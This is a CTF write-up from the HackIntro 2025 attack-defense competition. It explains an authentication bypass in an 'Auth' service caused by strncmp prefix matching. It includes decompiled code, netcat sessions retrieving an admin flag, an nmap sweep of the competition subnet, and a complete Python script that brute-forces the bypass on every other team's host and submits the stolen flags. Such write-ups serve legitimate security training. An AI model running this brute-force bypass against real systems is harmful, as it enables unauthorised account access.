# Auth Service Attack

This is a write-up from the 48 hour competition Hackintro 2025 (Homework 3).

This section covers the attack against the Auth service in the HackIntro 2025 Attack-Defense CTF. We identified a prefix matching vulnerability due to improper use of `strncmp`, allowing us to bypass authentication and retrieve flags from other teams.

## Copying the binary locally 

```bash 
base64 auth
***copying the generated text***
```

```bash
base64 -d auth.base64 > auth
chmod +x auth
```

## Finding the vulnerability in the code

```c
sVar1 = strlen(param_1);
iVar2 = strncmp(param_1,(char *)*local_10,sVar1);
if (iVar2 == 0) {
  sVar1 = strlen(param_2);
  iVar2 = strncmp(param_2,(char *)local_10[1],sVar1);
  if (iVar2 == 0) {
    DAT_0804a62c = local_10;
    return local_10;
  }
}
```

The flaw here is that the function uses `strlen()` on the input and then uses that length for `strncmp()`.

This creates a prefix matching vulnerability.

The fact that hidden profiles (like `_admin`) start with an underscore allows us to bypass full password checks. If we guess the correct first character of the admin password, we can login due to the prefix comparison flaw.
```c
void FUN_08048e0d(void)

{
  void *__ptr;
  
  __ptr = (void *)FUN_0804873b();
  FUN_0804880c("_admin",__ptr,1);
  FUN_0804880c("guest","guest",0);
  free(__ptr);
  return;
}
```

The line `FUN_0804880c("_admin",__ptr,1);` creates `_admin` with flag as password.

So if we can bruteforce the attack to check the letters a-z and numbers 0-9 we can find the first letter(or number) of the flag and login.


## Testing the Prefix Match on Other Teams 

Let's check if `auth g g` actually works on the
other teams:
```bash
auth@team05:/opt/services/auth$ nc 10.219.255.30 8000
Welcome! You can authenticate to the account "guest" with the password "guest"
To create an account with a hidden username, begin your username with ""
Available commands:
    list - list the available accounts
    create [name] [password] - create a new account
    auth [name] [password] - login to an account
    flag - print the flag (only for admins)
    quit - exit the program
Enter your command:
(not logged in) > auth g g
Authenticated as "guest"
Enter your command:
(guest) > list
Accounts:
    0: guest
    1: hidden
Enter your command:
```

That's promising.

```bash
auth@team05:/opt/services/auth$ nc 10.219.255.30 8000
Welcome! You can authenticate to the account "guest" with the password "guest"
To create an account with a hidden username, begin your username with ""
Available commands:
    list - list the available accounts
    create [name] [password] - create a new account
    auth [name] [password] - login to an account
    flag - print the flag (only for admins)
    quit - exit the program
Enter your command:
(not logged in) > auth 1 
Couldn't authenticate.
Enter your command:
(not logged in) > auth _ 1
Authenticated as "_admin"
Enter your command:
(_admin) > flag
Here is the flag: 1625e15ac40b1a45e23f9514602b70195796986e46500cc80db7438fdebda9fa
Enter your command:
```

I got lucky there and managed to get it with
`auth _ 1`. Now that we know it actually works
we need to bruteforce it.

Scanning with nmap we can find all the addresses of the other teams and exploit them (we won't be attacking our address .18).
```bash
ilias@ilias-PC:~/Desktop/hw3-sec/auth$ nmap -sn 10.219.255.0/24 -oA net_ping
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-05-31 11:49 EEST
Nmap scan report for 10.219.255.2
Host is up (0.0076s latency).
Nmap scan report for 10.219.255.6
Host is up (0.0075s latency).
Nmap scan report for 10.219.255.10
Host is up (0.0075s latency).
Nmap scan report for 10.219.255.14
Host is up (0.0059s latency).
Nmap scan report for 10.219.255.18
Host is up (0.0058s latency).
Nmap scan report for 10.219.255.22
Host is up (0.0056s latency).
Nmap scan report for 10.219.255.26
Host is up (0.0049s latency).
Nmap scan report for 10.219.255.30
Host is up (0.0065s latency).
Nmap scan report for 10.219.255.34
Host is up (0.0059s latency).
Nmap scan report for 10.219.255.38
Host is up (0.0058s latency).
Nmap scan report for 10.219.255.42
Host is up (0.0052s latency).
Nmap scan report for 10.219.255.46
Host is up (0.0051s latency).
Nmap scan report for 10.219.255.50
Host is up (0.0055s latency).
Nmap scan report for 10.219.255.54
Host is up (0.0057s latency).
Nmap scan report for 10.219.255.58
Host is up (0.0059s latency).
Nmap scan report for 10.219.255.62
Host is up (0.0062s latency).
```

## Developing a Brute-Force Exploit

### Submitting Flags Automatically

We have a small python script here that sumbits the flag for us.

```python3
#!/usr/bin/env python3

import socket
import time
import requests
import string
from concurrent.futures import ThreadPoolExecutor, as_completed

# Configuration
API_KEY = "REDACTED" 
MY_IP = "10.219.255.18"
PORT = 8000
SUBMIT_URL = "https://ctf.hackintro25.di.uoa.gr/submit"

# Active IPs from nmap
TARGETS = [2, 6, 10, 14, 22, 26, 30, 34, 38, 42, 46, 50, 54, 58, 62]

class Colors:
    GREEN = '\033[92m'
    RED = '\033[91m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    END = '\033[0m'

def check_vulnerable(ip, port):
    """Check if target is vulnerable to prefix attack"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(3)
        sock.connect((ip, port))
        
        # Read banner
        sock.recv(4096)
        
        # Test vulnerability
        sock.send(b"auth g g\n")
        time.sleep(0.3)
        response = sock.recv(4096).decode()
        
        sock.close()
        
        return "Authenticated as" in response
    except:
        return False

def brute_force_first_char(ip, port):
    """Brute force the first character of the password"""
    # All possible characters
    chars = string.ascii_letters + string.digits + "{}_-!@#$%^&*()"
    
    for char in chars:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)
            sock.connect((ip, port))
            
            # Read banner
            sock.recv(4096)
            
            # Try auth with single character
            sock.send(f"auth _ {char}\n".encode())
            time.sleep(0.3)
            response = sock.recv(4096).decode()
            
            if "Authenticated as" in response and "_admin" in response:
                sock.close()
                return char
            
            sock.close()
            
        except:
            continue
    
    return None

def get_flag_with_char(ip, port, first_char):
    """Get flag using the discovered first character"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        sock.connect((ip, port))
        
        # Read banner
        sock.recv(4096)
        
        # Authenticate
        sock.send(f"auth _ {first_char}\n".encode())
        time.sleep(0.3)
        auth_response = sock.recv(4096).decode()
        
        if "Authenticated as" in auth_response:
            # Get flag
            sock.send(b"flag\n")
            time.sleep(0.3)
            flag_response = sock.recv(4096).decode()
            
            if "Here is the flag:" in flag_response:
                flag = flag_response.split("Here is the flag:")[1].strip().split('\n')[0]
                sock.close()
                return flag
        
        sock.close()
    except:
        pass
    
    return None

def exploit_single_target(ip_suffix):
    """Exploit a single target with brute force"""
    ip = f"10.219.255.{ip_suffix}"
    
    # Skip our own IP
    if ip == MY_IP:
        return None
    
    print(f"{Colors.YELLOW}[*] Attacking {ip}{Colors.END}")
    
    # Check if vulnerable
    if not check_vulnerable(ip, PORT):
        print(f"{Colors.RED}[-] {ip} is patched or down{Colors.END}")
        return None
    
    print(f"{Colors.GREEN}[+] {ip} is vulnerable!{Colors.END}")
    
    # Brute force first character
    print(f"{Colors.YELLOW}[*] Brute forcing first character for {ip}...{Colors.END}")
    first_char = brute_force_first_char(ip, PORT)
    
    if not first_char:
        print(f"{Colors.RED}[-] Could not find first character for {ip}{Colors.END}")
        return None
    
    print(f"{Colors.GREEN}[+] Found first character for {ip}: '{first_char}'{Colors.END}")
    
    # Get flag
    flag = get_flag_with_char(ip, PORT, first_char)
    
    if flag:
        print(f"{Colors.GREEN}[!!!] FLAG from {ip}: {flag}{Colors.END}")
        return {"ip": ip, "flag": flag, "first_char": first_char}
    else:
        print(f"{Colors.RED}[-] Could not get flag from {ip}{Colors.END}")
        return None

def submit_flag(flag):
    """Submit a flag to the scoring server"""
    headers = {
        "Content-Type": "application/json",
        "Authorization": f"Bearer {API_KEY}"
    }
    data = {"flag": flag}
    
    try:
        response = requests.post(SUBMIT_URL, headers=headers, json=data, timeout=5)
        return response.json() if response.status_code == 200 else response.text
    except Exception as e:
        return f"Error: {e}"

def main():
    print(f"{Colors.BLUE}=== Auth Service Brute Force Exploitation ==={Colors.END}")
    print(f"{Colors.YELLOW}[*] Targeting auth service on port {PORT}{Colors.END}")
    print(f"{Colors.YELLOW}[*] Will brute force each vulnerable target{Colors.END}")
    print(f"{Colors.YELLOW}[*] Skipping our IP: {MY_IP}{Colors.END}\n")
    
    results = []
    flags_found = []
    
    # Use thread pool for faster exploitation
    with ThreadPoolExecutor(max_workers=5) as executor:  # Reduced workers to avoid overwhelming targets
        # Submit all tasks
        future_to_ip = {executor.submit(exploit_single_target, ip): ip for ip in TARGETS}
        
        # Process results as they complete
        for future in as_completed(future_to_ip):
            result = future.result()
            if result:
                results.append(result)
                flags_found.append(result['flag'])
                
                # Submit flag immediately
                print(f"{Colors.YELLOW}[*] Submitting flag from {result['ip']}...{Colors.END}")
                submit_result = submit_flag(result['flag'])
                print(f"{Colors.GREEN}[+] Submission result: {submit_result}{Colors.END}\n")
    
    # Summary
    print(f"\n{Colors.BLUE}=== Summary ==={Colors.END}")
    print(f"Total targets scanned: {len(TARGETS)}")
    print(f"Total flags captured: {len(flags_found)}")
    
    # Save results
    with open("auth_bruteforce_results.txt", "w") as f:
        f.write("=== Auth Service Brute Force Results ===\n")
        f.write(f"Exploitation time: {time.strftime('%Y-%m-%d %H:%M:%S')}\n\n")
        for result in results:
            f.write(f"{result['ip']}: flag={result['flag']} (first_char='{result['first_char']}')\n")
    
    print(f"\n{Colors.GREEN}Results saved to auth_bruteforce_results.txt{Colors.END}")
    
    # Print discovered passwords for future use
    print(f"\n{Colors.BLUE}=== Discovered Password Prefixes ==={Colors.END}")
    for result in results:
        print(f"{result['ip']}: '{result['first_char']}'")

if __name__ == "__main__":
    main()
```

Some flags didn't get sumbitted properly when we originally wrote the script so we also wrote a small bash script to sumbit flags manually like this:

```bash
./sumbit_flag.sh flag1 flag2 flag3 ...
```

```bash
#!/bin/bash
API_KEY="REDACTED"

for FLAG in "$@"; do
  curl https://ctf.hackintro25.di.uoa.gr/submit \
    -H "Content-Type: application/json" \
    -H "Authorization: Bearer $API_KEY" \
    -d "{\"flag\": \"$FLAG\"}"
done
```
